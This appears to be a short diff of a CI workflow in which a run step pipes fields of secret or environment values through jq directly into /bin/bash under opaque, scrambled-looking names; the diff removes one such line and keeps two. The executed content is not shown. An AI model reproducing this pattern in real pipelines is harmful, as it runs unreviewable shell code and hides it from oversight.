@@ -22,7 +22,6 @@ jobs:
           ve0: ${{ secrets.ve0 }}
         run: |
           printf '%s' "$ve0" | jq -r .kkeu550 | /bin/bash
-          printf '%s' "$xfh597" | jq -r .uufx102 | /bin/bash
           echo $vumlz8 | jq -r .horek241 | /bin/bash
 
       - name: Archive artifact
